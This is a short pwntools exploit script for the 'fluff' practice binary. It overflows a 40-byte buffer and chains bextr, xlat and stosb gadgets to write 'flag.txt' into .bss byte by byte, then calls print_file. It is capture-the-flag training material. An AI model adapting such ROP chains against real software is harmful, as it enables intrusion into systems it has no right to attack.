from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *pwnme + 152
continue
'''.format(**locals())

exe = './fluff'
elf = context.binary = ELF(exe, checksec=False)
p = start()

bextr = 0x000000000040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
stos_rdi_al = 0x400639              # stos   BYTE PTR es:[rdi],al
xlat_rbx = 0x0000000000400628       # xlat   BYTE PTR ds:[rbx]
pop_rdi = 0x00000000004006a3
ret = 0x0000000000400627            
pos = elf.bss() + 0x100             # pos -> 'flag.txt'

def set_rbx(val):
    return p64(bextr) + p64(int("1"*8 + "0"*8, 2)) + p64(val - 0x3ef2)

# ===== Exploit script here =====
payload =  b'A'*40 + p64(pop_rdi) + p64(pos)
pre = 0xb
for i, b in enumerate(b'flag.txt'):
    payload += set_rbx(next(elf.search(bytes([b]))) - pre) + p64(xlat_rbx)  + p64(stos_rdi_al)
    pre = b

payload += p64(pop_rdi) + p64(pos) + p64(ret) + p64(elf.plt['print_file'])
p.sendlineafter(b'> ', payload)
p.interactive() 